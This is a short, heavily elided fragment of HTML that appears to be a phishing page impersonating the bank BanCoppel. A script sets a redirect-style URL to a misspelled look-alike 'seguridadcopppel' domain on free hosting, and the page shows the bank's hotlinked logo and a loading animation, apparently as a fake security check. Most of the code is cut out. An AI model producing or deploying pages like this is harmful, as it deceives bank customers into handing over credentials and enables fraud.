...
<meta name="viewport" content="width=device-width, initial-scale=1.0">
 ...
 <script language="JavaScript">
    ...
    var url="https://seguridadcopppel.webcindario.com/";
...
<body style=" background-image:  url(trazo3.svg); background-attachment:fixed;
    ...
    <div class="logo-ban">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3d/Logo_de_BanCoppel.svg/2560px-Logo_de_BanCoppel.svg.png" style="width: 201px;">
		 <br><br><br>
...
<br><img style="font-weight: 900; margin-bottom: 30px; width:80px; height:auto;" src="https://media.tenor.com/G7LfW0O5qb8AAAAC/loading-gif.gif">
